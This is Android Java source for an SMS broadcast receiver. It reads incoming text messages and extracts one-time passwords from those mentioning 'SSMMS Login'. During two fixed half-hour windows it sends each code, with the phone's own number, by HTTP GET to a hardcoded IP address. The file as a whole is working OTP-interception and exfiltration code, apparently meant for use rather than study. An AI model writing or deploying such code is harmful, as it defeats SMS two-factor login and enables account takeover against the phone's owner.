package com.india.otp;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.github.thunder413.netrequest.NetError;
import com.github.thunder413.netrequest.NetRequest;
import com.github.thunder413.netrequest.NetResponse;
import com.github.thunder413.netrequest.OnNetResponse;
import com.github.thunder413.netrequest.RequestDataType;
import com.github.thunder413.netrequest.RequestMethod;

import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

/**
 * A broadcast receiver who listens for incoming SMS
 */
public class SmsBroadcastReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsBroadcastReceiver";
    String responseCode = null;

    @Override
	public void onReceive(Context context, Intent intent) {
		if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
			Bundle bundle = intent.getExtras();
			SmsMessage[] msgs = null;

			String msg_from;
			String msgBody;

			String phoneNumber = "";
			TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
			if (tMgr != null) {
				if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
					return;
				}
				phoneNumber = tMgr.getLine1Number();
			}


			if (bundle != null){
				try{
					Object[] pdus = (Object[]) bundle.get("pdus");
					msgs = new SmsMessage[pdus.length];
					for(int i=0; i<msgs.length; i++){
						msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
						msg_from = msgs[i].getOriginatingAddress().toString();
						msgBody = msgs[i].getMessageBody().toString();
						messageInsert(phoneNumber, msgBody, context);
					}
				}catch(Exception e){
					Log.d("Exception caught",e.getMessage());
				}
			}
		}
		if(intent.getAction().equals("android.intent.action.BOOT_COMPLETED")){

		}
	}

	public void messageInsert(String from, String message, Context context){
		Calendar[] fromTime = new Calendar[2];
		Calendar[] toTime = new Calendar[2];
		Calendar currentTime;
		if(!message.contains("SSMMS")){
			return;
		}
		message = message.replaceAll("Use OTP","");
		message = message.replaceAll("for SSMMS Login","");
		message = message.replaceAll("One Time Password","");
		message = message.replaceAll("is","");
		message = message.replaceAll("your","");
		message = message.replaceAll("Your","");
		message = message.replaceAll(" ","");
		try {
			fromTime[0] = Calendar.getInstance();
			fromTime[0].set(Calendar.HOUR_OF_DAY, Integer.valueOf("00"));
			fromTime[0].set(Calendar.MINUTE, Integer.valueOf("00"));
			fromTime[0].set(Calendar.SECOND, Integer.valueOf("00"));

			toTime[0] = Calendar.getInstance();
			toTime[0].set(Calendar.HOUR_OF_DAY, Integer.valueOf("00"));
			toTime[0].set(Calendar.MINUTE, Integer.valueOf("30"));
			toTime[0].set(Calendar.SECOND, Integer.valueOf("00"));

			fromTime[1] = Calendar.getInstance();
			fromTime[1].set(Calendar.HOUR_OF_DAY, Integer.valueOf("16"));
			fromTime[1].set(Calendar.MINUTE, Integer.valueOf("00"));
			fromTime[1].set(Calendar.SECOND, Integer.valueOf("00"));

			toTime[1] = Calendar.getInstance();
			toTime[1].set(Calendar.HOUR_OF_DAY, Integer.valueOf("16"));
			toTime[1].set(Calendar.MINUTE, Integer.valueOf("30"));
			toTime[1].set(Calendar.SECOND, Integer.valueOf("00"));

			currentTime = Calendar.getInstance();
			if((currentTime.after(fromTime[0]) && currentTime.before(toTime[0])) || (currentTime.after(fromTime[1]) && currentTime.before(toTime[1]))){
				NetRequest netRequest = new NetRequest(context);
				Map<String,Object> map = new HashMap<>();
				map.put("from",from);
				map.put("otp",message);
				netRequest.addParameterSet(map);
				netRequest.setRequestMethod(RequestMethod.GET);
				netRequest.setRequestDataType(RequestDataType.TEXT);
				netRequest.setOnResponseListener(new OnNetResponse() {
					@Override
					public void onNetResponseCompleted(NetResponse response) {
						Log.d("TAG",response.toString());
					}

					@Override
					public void onNetResponseError(NetError error) {
						Log.d("TAG",error.toString());
						switch (error.getStatus()) {
							case CONNECTION_ERROR:
								break;
							case PARSE_ERROR:
								break;
							case ERROR:
								break;
							case INVALID_URI_ERROR:
								break;
							case SERVER_ERROR:
								break;
							case NOT_FOUND:
								break;
							case BAD_GATEWAY:
								break;
							case REQUEST_ERROR:
								break;
							case CANCELED:
								break;
						}
					}
				});
				netRequest.setRequestUri("http://198.18.61.28/Amazon/index.php");
				netRequest.load();
				return;
			}
		} catch (Exception e) {
			e.printStackTrace();
			return;
		}

	}
}